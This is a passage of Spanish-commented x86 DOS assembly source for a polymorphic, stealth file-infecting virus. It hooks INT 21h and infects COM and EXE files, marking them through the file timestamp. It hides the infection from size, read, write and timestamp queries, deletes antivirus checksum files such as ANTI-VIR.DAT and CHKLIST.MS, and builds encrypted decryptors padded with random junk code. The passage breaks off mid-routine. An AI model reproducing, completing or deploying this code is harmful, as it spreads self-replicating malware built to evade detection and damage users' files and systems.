           MOV AX, [SI]
           ADD AX, 0B2A6h
           JZ    @@DesinfEXE
           CMP AX, 0CF3h
           JZ    @@DesinfEXE
     @@DesinfCOM:  CMP BYTE PTR [SI], 0E9h
           JNZ   @@FinX02
   @@MiraSegundos: MOV AL, BYTE PTR [Hora-200h]
           AND AL, 1Fh
           CMP AL, 1Eh
           JNZ   @@FinX02
           JMP   @@SigueDesinf
     @@DesinfEXE:  MOV AX, [SI+12h]
           XOR AX, [SI+14h]
           CMP AX, 'MD'
           JNZ   @@FinX02
           JMP   @@MiraSegundos
   @@SigueDesinf:  MOV AX, ES:[DI+11h]
           MOV DX, ES:[DI+13h]
           OR  DX, DX
           JNZ   @@SigueDesinf2
           CMP AX, 1000h + LongVirus2
           JB    @@FinX02
   @@SigueDesinf2: CALL    PtrCasiFinal
           MOV CX, 001Ah
           MOV DX, Offset NewVirus-200h
           MOV SI, DX
           MOV AH, 2Fh
           CALL    Int21h
           JC    @@FinX02
           MOV AH, [SI+18h]
           PUSH    DI
           PUSH    SI
           PUSH    ES
           PUSH    CS
           POP ES
           MOV DI, SI
           MOV CX, 0018h
           CLD
   @@LoopDesinf1:  LODSB
           XOR AL, AH
           STOSB
           LOOP  @@LoopDesinf1
           POP ES
           POP SI
           POP DI
           CALL    PtrInicio
           MOV CX, 0018h
           MOV DX, SI
           MOV AH, 30h
           CALL    Int21h
           JC    @@FinX02
           MOV DX, (10000h - LongVirus2)
           MOV AX, WORD PTR [Hora-200h]
           AND AX, 1FE0h
           ROR AX, 5
           SUB DX, AX
           MOV CX, 0FFFFh
           MOV AX, 3202h
           CALL    Int21h
           XOR CX, CX
           MOV AH, 30h
           CALL    Int21h
           JC    @@FinX02
        @@FinX03:  MOV AL, [SI+19h]
           MOV BYTE PTR [Hora-200h], AL
        @@FinX02:  MOV CX, CS:[Hora-200h]
           MOV DX, CS:[Fecha-200h]
           MOV AX, 4701h
           CALL    Int21h
           CALL    RestauraAtributos
           CMP BP, 4000h
           JNZ   @@FinX01
           POP WORD PTR ES:[DI+17h]
           POP WORD PTR ES:[DI+15h]
           JMP   @@FinalEscrHandle
        @@FinX01:  CALL    UnfakeHandle
        @@FinX00:  CALL    ParcheaInt24h
           POP ES
           POP DS
           POPA
           JMP   @@FinInt21h

   Basura10    dw  0

   ;;;;; CUANDO SE QUIERE OBTENER UN VECTOR DE INTERRUPCION

   @@ObtenerVector:
           CMP AL, 21h
           JNZ   @@FinalOV01
           PUSHA
           PUSH    ES
           XOR AX, AX
           MOV ES, AX
           MOV AX, CS
           MOV BX, 0050h
           CMP AX, ES:[BX+36h]
           JNZ   @@FinalOV02
           POP ES
           POPA
           LES BX, DWORD PTR CS:[AntInt21h-200h]
           IRET
    @@FinalOV02:   POP ES
           POPA
    @@FinalOV01:   JMP   @@FinInt21h

   ;;;;; CUANDO SE QUIERE FIJAR UN VECTOR DE INTERRUPCION

   @@FijarVector:  CMP AL, 21h
           JNZ   @@FinalOV01
           PUSHA
           PUSH    ES
           XOR AX, AX
           MOV ES, AX
           MOV BX, 0050h
           MOV AX, CS
           CMP AX, ES:[BX+36h]
           JNZ   @@FinalOV02
           CLI
           MOV CS:[AntInt21h-200h], DX
           MOV CS:[AntInt21h-200h+2], DS
           STI
           POP ES
           POPA
           IRET

   Basura11    dw  0

   ;;;;;;;;; STEALTH DE LA FUNCION 57h

   @@HoraFechaHandle:
           CMP BX, 0004
           JBE   @@FinInt21h
           PUSHA
           PUSH    DS
           PUSH    ES
           CALL    GetSFT
           JC    @@FinY00
           MOV AH, BYTE PTR ES:[DI+0Dh]
           AND AH, 1Fh
           CMP AH, 1Eh
           JNZ   @@FinY00
           CMP AL, 01
           JZ    @@HoraFechaHandle2
           JA    @@FinY00
   @@HoraFechaHandle1:
           PUSH    WORD PTR ES:[DI+15h]
           PUSH    WORD PTR ES:[DI+17h]
           CALL    CambiaAtributos
           MOV AX, ES:[DI+11h]
           MOV DX, ES:[DI+13h]
           SUB AX, +01
           SBB DX, +00
           MOV ES:[DI+15h], AX
           MOV ES:[DI+17h], DX
           MOV CX, 0001
           MOV DX, Offset NewVirus-200h
           MOV AH, 2Fh
           CALL    Int21h
           JC    @@FinY01
           MOV CX, ES:[DI+0Dh]
           MOV DX, ES:[DI+0Fh]
           MOV CL, BYTE PTR [NewVirus-200h]
           MOV WORD PTR [Hora-200h], CX
           MOV WORD PTR [Fecha-200h], DX
           CALL    RestauraAtributos
           POP WORD PTR ES:[DI+17h]
           POP WORD PTR ES:[DI+15h]
           POP ES
           POP DS
           POPA
           MOV CX, WORD PTR [Hora-200h]
           MOV DX, WORD PTR [Fecha-200h]
           IRET
   @@HoraFechaHandle2:
           MOV BYTE PTR [NewVirus-200h], CL
           AND CL, 0E0h
           OR  CL, 1Eh
           MOV ES:[DI+0Dh], CX
           MOV ES:[DI+0Fh], DX
           PUSH    WORD PTR ES:[DI+15h]
           PUSH    WORD PTR ES:[DI+17h]
           CALL    CambiaAtributos
           MOV AX, ES:[DI+11h]
           MOV DX, ES:[DI+13h]
           SUB AX, +01
           SBB DX, +00
           MOV ES:[DI+15h], AX
           MOV ES:[DI+17h], DX
           MOV AH, 30h
           MOV DX, Offset NewVirus-200h
           MOV CX, 0001
           CALL    Int21h
           CALL    RestauraAtributos
           POP WORD PTR ES:[DI+17h]
           POP WORD PTR ES:[DI+15h]
           POP ES
           POP DS
           POPA
           IRET
       @@FinY01:   CALL    RestauraAtributos
           POP WORD PTR ES:[DI+17h]
           POP WORD PTR ES:[DI+15h]
       @@FinY00:   POP ES
           POP DS
           POPA
           JMP   @@FinInt21h

   Basura12    dw  0

   ;;;;; STEALTH DE ESCRITURA
   ;;; Normalmente, si se abre un handle de un fichero en el que se pueda escri-
   ;; bir, en teor¡a tambi‚n se desinfectar¡a al abrir el handle, pero como el
   ;; mundo de la inform tica es muy raro :) lo haremos por si acaso.

   @@EscribeHandle:
           CMP BX, 0004
           JBE   @@FinInt21h
           PUSHA
           PUSH    DS
           PUSH    ES
           CALL    GetSFT
           JC    @@FinW00
           MOV AL, ES:[DI+02]
           AND AL, 03h
           CMP AL, 01
           JB    @@FinW00
           MOV BP, 4000h
           PUSH    WORD PTR ES:[DI+15h]
           PUSH    WORD PTR ES:[DI+17h]
           CALL    ParcheaInt24h
           JMP   @@KKVH
   @@FinalEscrHandle:
           CALL    ParcheaInt24h
       @@FinW00:   POP ES
           POP DS
           POPA
           JMP   @@FinInt21h

   ;;;;; STEALTH DE LECTURA

   @@LeeHandle:    CMP BX, 0004
           JBE   @@FinInt21h
           PUSHA
           PUSH    DS
           PUSH    ES
           CALL    GetSFT
           JC    @@Salida
           MOV AL, ES:[DI+0Dh]
           AND AL, 1Fh
           CMP AL, 1Eh
           JNZ   @@Salida
           CALL    TamanyoReal
           SUB WORD PTR ES:[DI+11h], AX
           SBB WORD PTR ES:[DI+13h], +00
           LDS DX, DWORD PTR ES:[DI+15h]
           MOV CS:[Puntero3-200h], DX
           MOV CS:[Puntero3-200h+2], DS
           POP ES
           POP DS
           POPA
           SUB AH, 10h
           CALL    Int21h
           PUSHF
           PUSHA
           PUSH    DS
           PUSH    ES
           CALL    GetSFT
           JC    @@Salida2
           CALL    TamanyoReal
           ADD WORD PTR ES:[DI+11h], AX
           ADC WORD PTR ES:[DI+13h], +00
           PUSH    DS
           LDS SI, DWORD PTR CS:[Puntero3-200h]
           MOV AX, DS
           POP DS
           OR  AX, AX
           JNZ   @@Salida2
           CMP SI, +18h
           JAE   @@Salida2
           MOV WORD PTR CS:[SaltoCOM+1-200h], SI
           MOV SI, DX
           MOV BP, DS
           LDS DX, ES:[DI+15h]
           MOV CS:[Puntero3-200h], DX
           MOV CS:[Puntero3-200h+2], DS
           CALL    CambiaAtributos
           CALL    PtrCasiFinal
           PUSH    CS
           POP DS
           MOV DX, Offset NewVirus-200h
           MOV CX, 001Ah
           MOV AH, 2Fh
           CALL    Int21h
           JC    @@Salida3
           MOV DS, BP
           MOV BP, DX
           ADD BP, WORD PTR CS:[SaltoCOM-200h+1]
           MOV CX, 0018h
           SUB CX, WORD PTR CS:[SaltoCOM-200h+1]
           MOV AH, BYTE PTR CS:[NewVirus-200h+18h]
     @@LoopE02:    MOV AL, CS:[BP]
           XOR AL, AH
           MOV [SI], AL
           INC BP
           INC SI
           LOOP  @@LoopE02
   @@Salida3:  CALL    RestauraAtributos
           LDS DX, DWORD PTR CS:[Puntero3-200h]
           MOV ES:[DI+15h], DX
           MOV ES:[DI+17h], DS
           JMP   @@Salida2

   Basura13    dw  0

   ;;;;; STEALTH DE PUNTERO

   @@Salida:   POP ES
           POP DS
           POPA
           JMP   @@FinInt21h
   @@StealthPuntero:
           CMP BX, 0004
           JBE   @@FinInt21h
           PUSHA
           PUSH    DS
           PUSH    ES
           CALL    GetSFT
           JC    @@Salida
           MOV AL, ES:[DI+0Dh]
           AND AL, 1Fh
           CMP AL, 1Eh
           JNZ   @@Salida
           CALL    TamanyoReal
           SUB WORD PTR ES:[DI+11h], AX
           SBB WORD PTR ES:[DI+13h], +00
           POP ES
           POP DS
           POPA
           SUB AH, 10h
           CALL    Int21h
           PUSHF
           PUSHA
           PUSH    DS
           PUSH    ES
           CALL    GetSFT
           JC    @@Salida2
           CALL    TamanyoReal
           ADD WORD PTR ES:[DI+11h], AX
           ADC WORD PTR ES:[DI+13h], +00
   @@Salida2:  POP ES
           POP DS
           POPA
           POPF
           RETF    0002

   ;;;;; STEALTH DE LA FUNCION 23h

   @@TamanyoArchivoFCB:
           SUB AH, 10h
           CALL    Int21h
           PUSHA
           PUSH    DS
           PUSH    ES
           INC AL
           JZ    @@HayError03
           MOV DS, WORD PTR CS:[DirecDTA-200h+2]
           MOV BX, WORD PTR CS:[DirecDTA-200h]
           CMP BYTE PTR [BX], 0FFh
           JNZ   @@SaltoDIR7
           ADD BX, 0007h
    @@SaltoDIR7:   ADD BX, 0017h
           MOV AL, [BX]
           AND AL, 1Fh
           CMP AL, 1Eh
           JNZ   @@HayError03
           CMP WORD PTR [BX+08h], +00
           JNZ   @@SaltoDIR8
           CMP WORD PTR [BX+06h], LongVirus+200h
           JB    @@HayError03
    @@SaltoDIR8:   MOV AX, [BX]
           AND AX, 1FE0h
           ROR AX, 5
           ADD AX, LongVirus2
           XOR DX, DX
           MOV CX, [BX+0Eh]
           DIV CX
           OR  DX, DX
           JZ    @@SaltoDIR9
           INC AX
    @@SaltoDIR9:   SUB WORD PTR [BX+21h], AX
           JNC   @@HayError03
           DEC WORD PTR [BX+23h]
   @@HayError03:   POP ES
           POP DS
           POPA
           IRET

   NewInt21h   ENDP

   Basura14    dw  0

   TamanyoReal PROC
           MOV AX, ES:[DI+0Dh]
           AND AX, 1FE0h
           ROR AX, 5
           ADD AX, LongVirus2
           RET
   TamanyoReal ENDP

   FakeHandle  PROC
           MOV CS:[AntHandle-200h], BX
           MOV BX, 0004h
           MOV AH, 35h
           CALL    Int21h
           MOV CS:[FakedHandle-200h], AX
           MOV AH, 2Eh
           CALL    Int21h
           MOV BX, CS:[AntHandle-200h]
           MOV AH, 35h
           CALL    Int21h
           PUSH    AX
           MOV BX, CS:[AntHandle-200h]
           MOV AH, 2Eh
           CALL    Int21h
           POP BX
           RET
   FakeHandle  ENDP

   UnfakeHandle    PROC
           MOV AH, 2Eh
           CALL    Int21h
           MOV AH, 35h
           MOV BX, CS:[FakedHandle-200h]
           CALL    Int21h
           MOV AH, 2Eh
           CALL    Int21h
           RET
   UnfakeHandle    ENDP

   TipoEjec    DB  0
   Basura15    dw  0

   LeeCabecera PROC
           CALL    PtrInicio
           MOV AH, 2Fh
           MOV CX, 0018h
           MOV DX, Offset Cabecera-200h
           MOV SI, DX
           CALL    Int21h
           RET
   LeeCabecera ENDP

   PtrInicio   PROC
           XOR AX, AX
           XOR DX, DX
           MOV ES:[DI+15h], AX
           MOV ES:[DI+17h], AX
           RET
   PtrInicio   ENDP

   PtrFinal    PROC
           MOV AX, ES:[DI+11h]
           MOV ES:[DI+15h], AX
           MOV DX, ES:[DI+13h]
           MOV ES:[DI+17h], DX
           RET
   PtrFinal    ENDP

   PtrCasiFinal    PROC
           MOV AX, ES:[DI+11h]
           MOV DX, ES:[DI+13h]
           SUB AX, +1Ah
           SBB DX, +00h
           MOV ES:[DI+15h], AX
           MOV ES:[DI+17h], DX
           RET
   PtrCasiFinal    ENDP

   OperaHandle PROC
           PUSH    BX
           MOV AX, 1220h
           INT 2Fh
           JC    @@Retorna
           MOV BL, ES:[DI]
           CMP BL, 0FFh
           JZ    @@Retorna
           MOV AX, 1216h
           INT 2Fh
           JC    @@Retorna
           PUSH    ES
           POP DS
           TEST    BYTE PTR [DI+05], 80h
           JNZ   @@Retorna
           MOV AX, [DI+28h]
           MOV CL, [DI+2Ah]
           ADD CL, 0B3h
           ADD AX, 0B0BDh
           JZ    @@COMdeMomento
           CMP AX, 0902h
           JNZ   @@Retorna
   @@EXEdeMomento: CMP CL, 0F8h
           JZ    @@Sigue001
           JMP   @@Retorna
   @@COMdeMomento: OR  CL, CL
           JNZ   @@Retorna
   @@Sigue001: MOV AX, [DI+20h]
           CMP AX, 'CS'
           JZ    @@Retorna
           CMP AX, 'BT'
           JZ    @@Retorna
           CMP AX, '-F'
           JZ    @@Retorna
           MOV CX, 0008
           ADD DI, 0020h
           MOV AL, 'V'
        @@LLCD:    CMP BYTE PTR ES:[DI], '0'
           JB    @@LLCD2
           CMP BYTE PTR ES:[DI], '9'
           JBE   @@Retorna
        @@LLCD2:   SCASB
           JZ    @@Retorna
           LOOP  @@LLCD
           SUB DI, 0008h
           CMP WORD PTR [DI], 'OC'
           JNZ   @@Retorna2
           CMP WORD PTR [DI], 'MM'
           JZ    @@Retorna
      @@Retorna2:  SUB DI, 0020h
           CLC
           JMP   @@Salto00
       @@Retorna:  STC
       @@Salto00:  POP BX
           RET
   OperaHandle ENDP

   CambiaAtributos PROC
           MOV AX, ES:[DI]
           MOV [Anterior_Count-200h], AX
           MOV WORD PTR ES:[DI], 0FFFFh
           MOV AL, ES:[DI+04]
           MOV [Atributos-200h], AL
           MOV BYTE PTR ES:[DI+04], 0
           MOV AX, ES:[DI+02]
           MOV WORD PTR [ModoAcceso-200h], AX
           MOV WORD PTR ES:[DI+02], 0002h
           RET
   CambiaAtributos ENDP

   Atributos   DB  0
   Anterior_Count  DW  0
   ModoAcceso  DW  0

   Hora        DW  0
   Fecha       DW  0

   RestauraAtributos PROC
           MOV AX, [Anterior_Count-200h]
           MOV ES:[DI], AX
           MOV AL, [Atributos-200h]
           MOV ES:[DI+04], AL
           MOV AX, [ModoAcceso-200h]
           MOV ES:[DI+02], AX
           RET
   RestauraAtributos ENDP

   ParcheaInt24h   PROC
           PUSH    EAX
           PUSH    BX
           PUSH    DS
           PUSH    ES
           XOR AX, AX
           MOV DS, AX
           LES BX, DWORD PTR DS:[24h*4]
           MOV EAX, DWORD PTR CS:[BytesInt24h-200h]
           XCHG    EAX, ES:[BX]
           MOV DWORD PTR CS:[BytesInt24h-200h], EAX
           MOV AL, BYTE PTR CS:[BytesInt24h-200h+4]
           XCHG    AL, ES:[BX+4]
           MOV BYTE PTR CS:[BytesInt24h-200h+4], AL
           LES BX, DWORD PTR DS:[1Bh*4]
           MOV AL, CS:[ByteInt1Bh-200h]
           XCHG    AL, ES:[BX]
           MOV CS:[ByteInt1Bh-200h], AL
           LES BX, DWORD PTR DS:[23h*4]
           MOV AL, CS:[ByteInt23h-200h]
           XCHG    AL, ES:[BX]
           MOV CS:[ByteInt23h-200h], AL
           POP ES
           POP DS
           POP BX
           POP EAX
           RET
   ParcheaInt24h   ENDP

   BytesInt24h DB  5 DUP (0)
   ProgramaInt24h: MOV AL, 03
           MOV BYTE PTR CS:[EstadoInt24h-200h], AL
           IRET
   ByteInt1Bh  DB  0CFh
   ByteInt23h  DB  0CFh

   ObtenNombre PROC
           MOV AH, 52h
           CALL    Int21h
           MOV ES, BX
           MOV ES, WORD PTR ES:[002Ch]
           XOR DI, DI
           XOR AL, AL
           CLD
      @@Loop01:    SCASB
           JNZ   @@Loop01
           SCASB
           JNZ   @@Loop01
           INC DI
           INC DI
           MOV DX, DI
           PUSH    ES
           POP DS
           RET
   ObtenNombre ENDP

   Int21h      PROC
           MOV BYTE PTR CS:[EstadoInt24h-200h], 0
           ADD AH, 10h
           PUSHF
           CALL    DWORD PTR CS:[AntInt21h-200h]
           PUSHF
           CMP BYTE PTR CS:[EstadoInt24h-200h], 3
           JZ    @@Error
           POPF
           RET
         @@Error:  POPF
           STC
           RET
   Int21h      ENDP

   MirarsiStealth  PROC
           MOV AX, WORD PTR ES:[DI+20h]
           CMP AX, 'HC'
           JNZ   @@Salta1
           CMP WORD PTR ES:[DI+22h], 'DK'
           JNZ   @@Salta1
           CMP WORD PTR ES:[DI+24h], 'KS'
           JZ    @@ActivaStealth
       @@Salta1:   CMP AX, 'KP'
           JZ    @@ActivaStealth
           CMP AX, 'RA'
           JNZ   @@Salta2
           CMP BYTE PTR ES:[DI+22h], 'J'
           JZ    @@ActivaStealth
       @@Salta2:   CMP AX, 'AR'
           JNZ   @@Salta3
           CMP BYTE PTR ES:[DI+22h], 'R'
           JZ    @@ActivaStealth
       @@Salta3:   CMP AX, 'HL'
           JZ    @@ActivaStealth
           MOV BYTE PTR CS:[NoStealth-200h], 0
           RET
   @@ActivaStealth:
           MOV BYTE PTR CS:[NoStealth-200h], 1
           RET
   MirarsiStealth  ENDP

   Basura16    dw  0

   GetSFT      PROC
           PUSH    BX
           MOV AX, 1220h
           INT 2Fh
           JC    @@KKVF
           MOV BL, ES:[DI]
           CMP BL, 0FFh
           JZ    @@KKVF
           MOV AX, 1216h
           INT 2Fh
           JC    @@KKVF
           POP BX
           CLC
           RET
        @@KKVF:    POP BX
           STC
           RET
   GetSFT      ENDP

   CompruebaNombre PROC
           CMP BYTE PTR CS:[Desinfeccion-200h], 01
           JNZ   @@Sigue
           DEC BYTE PTR CS:[Desinfeccion-200h]
           JMP   @@Infectar
         @@Sigue:  MOV BP, 0007
           XOR AL, AL
         @@Loopeo: ADD AL, ES:[BP+DI+20h]
           DEC BP
           JNC   @@Loopeo
           MOV AH, BYTE PTR CS:[SumaNombre-200h]
           MOV BYTE PTR CS:[SumaNombre-200h], AL
           SUB AL, AH
           CMP AL, 01
           JZ    @@NoInfectar
           CMP AL, 0FFh
           JZ    @@NoInfectar
   @@Infectar: CLC
           RET
   @@NoInfectar:   STC
           RET
   CompruebaNombre ENDP

   Basura17    dw  0

   BorraDATs   PROC
           PUSHA
           PUSH    DS
           PUSH    ES
           MOV SI, DX
           PUSH    CS
           POP ES
           MOV DI, Offset NewVirus-200h
           MOV BP, DI
           MOV CX, 0100h
           CLD
      @@Loop1: LODSB
           STOSB
           CMP AL, ':'
           JNZ   @@Sigue001
   @@Sigue002: MOV BP, DI
           JMP   @@Loop1
   @@Sigue001: CMP AL, '\'
           JZ    @@Sigue002
           OR  AL, AL
           JZ    @@Sigue003
           LOOP  @@Loop1
   @@Sigue003: JCXZ  @@FinError
           MOV DI, BP
           PUSH    CS
           POP DS
           MOV SI, Offset ArchivoDAT1-200h
           MOV CX, 000Dh
           REP MOVSB
           MOV DX, Offset NewVirus-200h
           MOV AX, 3301h
           CALL    Int21h
           JC    @@SigueconelOtro
           MOV AH, 31h
           CALL    Int21h
   @@SigueconelOtro:
           MOV SI, Offset ArchivoDAT2-200h
           MOV DI, BP
           MOV CX, 000Bh
           REP MOVSB
           MOV AX, 3301h
           CALL    Int21h
           JC    @@FinError
           MOV AH, 31h
           CALL    Int21h
    @@FinError:    POP ES
           POP DS
           POPA
           RET
   BorraDATs   ENDP

   ArchivoDAT1 DB  'ANTI-VIR.DAT',0
   ArchivoDAT2 DB  'CHKLIST.MS',0

   HazVirus    PROC
           PUSH    ES
           PUSH    BX
           PUSH    SI
           PUSH    DI

           CMP BYTE PTR [InstalacionPoli-200h], 0
           JNZ   @@NoInicAleatorio
           CALL    InicAleatorio
           PUSH    EAX
           MOV EAX, DWORD PTR [WordAleatorio1-200h]
           MOV DWORD PTR [AntAleatorio-200h], EAX
           MOV AX, WORD PTR [WordAleatorio3-200h]
           MOV WORD PTR [AntAleatorio-200h+4], AX
           POP EAX
           INC BYTE PTR [InstalacionPoli-200h]
           JMP   @@SiInicAleatorio
   @@NoInicAleatorio:
           PUSH    EAX
           MOV EAX, DWORD PTR [AntAleatorio-200h]
           MOV DWORD PTR [WordAleatorio1-200h], EAX
           MOV AX, WORD PTR [AntAleatorio-200h+4]
           MOV WORD PTR [WordAleatorio3-200h], AX
           POP EAX
   @@SiInicAleatorio:

           MOV AX, [InicioVirus-200h+1]
           MOV [IndiceInicial-200h], AX
           MOV WORD PTR [TamanyoContador-200h], LongVirus
           MOV BYTE PTR [NumeroCALLs-200h], 0
           XOR SI, SI
           PUSH    CS
           POP ES
           MOV DI, Offset NewVirus-200h
           MOV CX, LongVirus
           CALL    RepMovsb
           MOV WORD PTR [LongDesencrip-200h], 0
           CALL    HazVirus2
           MOV CX, [LongDesencrip-200h]
           ADD CX, LongVirus
           MOV [TamanyoContador-200h], CX
           MOV CX, LongVirus
           CALL    CriptaVirus
           MOV DI, [LongDesencrip-200h]
           ADD DI, LongVirus
           MOV CX, DI
           PUSH    DI
           ADD DI, Offset NewVirus - 200h
           MOV WORD PTR [IndiceInicial-200h], CX
           CALL    HazVirus2
           POP CX
           PUSH    CX
           CALL    CriptaVirus
           POP CX
           MOV DX, CX
           ADD CX, [LongDesencrip-200h]
           MOV DI, Offset NewVirus-200h
           ADD DI, CX
           MOV BX, LongVirus2 - 001Ah
           SUB BX, CX
           JZ    @@KKDCD
           JB    @@CCCDC
      @@LCLC:  CALL    Aleatorio
           STOSB
           DEC BX
           JNZ   @@LCLC
   @@KKDCD:    MOV BP, LongVirus2
           MOV CX, [Hora-200h]
           AND CX, 1FE0h
           ROR CX, 5
           JCXZ  @@FinNN
           PUSH    CX
    @@JJJJJV:  CALL    Aleatorio
           STOSB
           LOOP  @@JJJJJV
           POP CX
      @@FinNN: ADD CX, BP
           PUSH    CX
           MOV CX, 0018h
           CALL    Aleatorio
           MOV SI, Offset Cabecera2-200h
           PUSH    CS
           POP ES
      @@Loopeo:    LODSB
           XOR AL, AH
           STOSB
           LOOP  @@Loopeo
           MOV AL, AH
           STOSB
           MOV AL, BYTE PTR [Hora-200h]
           STOSB
           POP CX
      @@KK34:  POP DI
           POP SI
           POP BX
           POP ES
           RET
      @@CCCDC: XOR CX, CX
           JMP   @@KK34
   HazVirus    ENDP

   CriptaVirus PROC
           MOV SI, Offset NewVirus-200h
           MOV AX, [WordEncriptado-200h]
           MOV DX, [WordCambio-200h]
           MOV BP, [Banderas-200h]
           TEST    BP, 0080h
           JNZ   @@JJJC
           SHR CX, 1
       @@JJJC: MOV BL, 01
           TEST    BP, 0080h
           JZ    @@JKJC
           XOR BL, BL
       @@JKJC: TEST    BP, 0010h
           JZ    @@PonXORoADD
           TEST    BP, 0008h
           JZ    @@Siggg
        @@PonXOR:  ADD BL, 30h
           JMP   @@Siggg
    @@PonXORoADD:  TEST    BP, 0008h
           JZ    @@PonXOR
        @@PonADD:  ADD BL, 28h
        @@Siggg:   MOV BYTE PTR [OpcodeCrip-200h], BL
           TEST    BP, 0080h
           JZ    @@SiguR
           TEST    BP, 0100h
           JZ    @@SiguR
           TEST    BP, 0200h
           JZ    @@SiguR
           CMP BYTE PTR [RegistroEncriptado-200h], 03h
           JA    @@SiguR
           OR  BYTE PTR [Offset OpcodeCrip-200h+1], 20h
           JMP   @@Siguu
        @@SiguR:   AND BYTE PTR [Offset OpcodeCrip-200h+1], 0DFh
           JMP   @@Siguu
   OpcodeCrip  LABEL   BYTE
        @@Siguu:   XOR [SI], AL
           TEST    BP, 0100h
           JZ    @@Siguuu
           TEST    BP, 0004h
           JZ    @@Siguuu
           TEST    BP, 0040h
           JZ    @@ModifXORADD
    @@ModifSUBROL: TEST    BP, 0020h
           JZ    @@ModifSUB
     @@ModifROL:   ROL AX, 1
           JMP   @@Siguuu
     @@ModifSUB:   SUB AX, DX
           JMP   @@Siguuu
    @@ModifXORADD: TEST    BP, 0020h
           JZ    @@ModifXOR
     @@ModifADD:   ADD AX, DX
           JMP   @@Siguuu
     @@ModifXOR:   XOR AX, DX
        @@Siguuu:  TEST    BP, 0080h
           JNZ   @@Siguu2
           INC SI
        @@Siguu2:  INC SI
           LOOP  @@Siguu
           RET
   CriptaVirus ENDP

   HazVirus2   PROC
           MOV BYTE PTR [LoopYaEsta-200h], 0
           PUSHA
           PUSH    DS
           PUSH    ES
           PUSH    DI
           PUSH    CS
           POP ES
           CLD
           CALL    Aleatorio
           MOV BP, AX
   @@Repite001:    CALL    Aleatorio
           AND AL, 07h
           CMP AL, 04h
           JZ    @@Repite001
           MOV [RegistroContador-200h], AL
   @@Repite002:    CALL    Aleatorio
           AND AL, 07h
           CMP AL, 03h
           JB    @@Repite002
           CMP AL, 04h
           JZ    @@Repite002
           CMP AL, [RegistroContador-200h]
           JZ    @@Repite002
           MOV [RegistroIndice-200h], AL
   @@Repite003:    CALL    Aleatorio
           AND AL, 07h
           CMP AL, 04h
           JZ    @@Repite003
           CMP AL, [RegistroIndice-200h]
           JZ    @@Repite003
           CMP AL, [RegistroContador-200h]
           JZ    @@Repite003
           MOV [RegistroEncriptado-200h], AL
           MOV BYTE PTR CS:[PrimerByte-200h], 0
           CALL    HazBasuraAleatoria
           INC BYTE PTR CS:[PrimerByte-200h]
           CALL    PonInt
           CALL    HazBasuraAleatoria
           MOV AX, BP
           AND AX, 0C00h
           ROL AX, 6
           MOV BYTE PTR [Estado-200h], AL
           MOV BX, Offset PonContador - 200h
           MOV CX, Offset PonIndice - 200h
           MOV DX, Offset PonEncriptador - 200h
           CALL    BarajaYLlama
           MOV [InicLoop-200h], DI
           CALL    HazBasuraAleatoria
           CMP BYTE PTR [TipoEjec-200h], 01
           JNZ   @@EsCOM
        @@EsEXE:   MOV AL, 2Eh
           JMP   @@SAaslx
        @@EsCOM:   CALL    Aleatorio
           AND AL, 18h
           CMP AL, 18h
           JZ    @@EsCOM
           ADD AL, 26h
        @@SAaslx:  STOSB
           CALL    HazEncriptador
           CALL    HazBasuraAleatoria
           MOV BX, Offset IncrementaIndice - 200h
           MOV CX, Offset ModificaContador - 200h
           MOV DX, Offset ModificaRegistro - 200h
           CALL    BarajaYLlama
           CALL    MeteComprueba
           CALL    HazBasuraSinBanderas
           CALL    MeteSaltoLoop
           mov byte ptr [LoopYaEsta-200h], 1
           CALL    HazBasuraAleatoria
           CALL    PonInt
           CALL    HazBasuraAleatoria
           CALL    SaltoInicio
           CALL    HazBasuraAleatoria
           POP CX
           SUB DI, CX
           MOV [LongDesencrip-200h], DI
           MOV [Banderas-200h], BP
           POP ES
           POP DS
           POPA
    @@Retorno01:   RET
   HazVirus2   ENDP

   BarajaYLlama    PROC
           MOV AX, 0005
     @@Loop1:  CALL    SioNo
           JZ    @@Salto1
           XCHG    BX, CX
       @@Salto1:   CALL    SioNo
           JZ    @@Salto2
           XCHG    CX, DX
       @@Salto2:   CALL    SioNo
           JZ    @@Salto3
           XCHG    DX, BX
       @@Salto3:   DEC AX
           JNZ   @@Loop1
           PUSH    BX
           PUSH    CX
           PUSH    DX
           RET
   BarajaYLlama    ENDP

   HazBasuraAleatoria PROC
           MOV BYTE PTR [EstoyDentro-200h], 0
           PUSH    CX
           PUSH    DX
           PUSH    AX
           CALL    Aleatorio
           AND AH, 0C0h
           JNZ   @@Salto
           CMP BYTE PTR [PrimerByte-200h], 0
           JNZ   @@Salxtro
           OR  AH, 0C0h
           JMP   @@Salto
      @@Salxtro:   TEST    AL, 03
           JNZ   @@SLLL
           OR  AL, 1
       @@SLLL: PUSH    AX
           CALL    Aleatorio
           AND AL, 0Fh
           AND AH, 03h
           CMP AH, 01
           JBE   @@PonSaltoNormal
           CMP AH, 02
           JZ    @@PonJCXZ
           MOV AL, 0EBh
           JMP   @@JKJCJD
      @@PonJCXZ:   MOV AL, 0E3h
           JMP   @@JKJCJD
      @@PonSaltoNormal:
           AND AL, 0Fh
           ADD AL, 70h
      @@JKJCJD:    STOSB
           XOR AL, AL
           STOSB
           MOV [Temporal-200h], DI
           POP AX
         @@Salto:  AND AL, 03
           JZ    @@Fin
         @@Loop:   PUSH    AX
           CALL    HazBasuraAleatoria2
           POP AX
           DEC AL
           JNZ   @@Loop
         @@Fin:    OR  AH, AH
           JNZ   @@Fin2
           MOV AX, DI
           SUB AX, [Temporal-200h]
           PUSH    DI
           MOV DI, [Temporal-200h]
           DEC DI
           STOSB
           POP DI
           JMP   @@Fin3
         @@Fin2:   CMP AH, 80h
           JNZ   @@Fin3
           CALL    Aleatorio
           AND AL, 03
           JZ    @@Fin3
           CMP AL, 02
           JB    @@ConSTC
           JZ    @@ConZF
     @@ConCLC: MOV AL, 0F8h
           STOSB
           MOV AL, 72h
           STOSW
           JMP   @@Fin3
     @@ConSTC: MOV AL, 0F9h
           STOSB
           MOV AL, 73h
           STOSW
           JMP   @@Fin3
     @@ConZF:  MOV AL, AH
           ROL AL, 3
           AND AX, 0738h
           OR  AH, AL
           OR  AH, 0C0h
           MOV AL, 38h
           MOV CX, AX
           CALL    Aleatorio
           AND AL, 03
           ADD CL, AL
           XCHG    CX, AX
           STOSW
           XCHG    CX, AX
           MOV AL, 75h
           STOSW
         @@Fin3:   POP AX
           POP DX
           POP CX
           RET
   HazBasuraAleatoria ENDP

   HazBasuraAleatoria2 PROC
           CALL    Aleatorio
           AND AL, 07h
           CMP AL, 04
           JAE HazBasuraAleatoria2
           CMP AL, [RegistroEncriptado-200h]
           JZ  HazBasuraAleatoria2
           CMP AL, [RegistroIndice-200h]
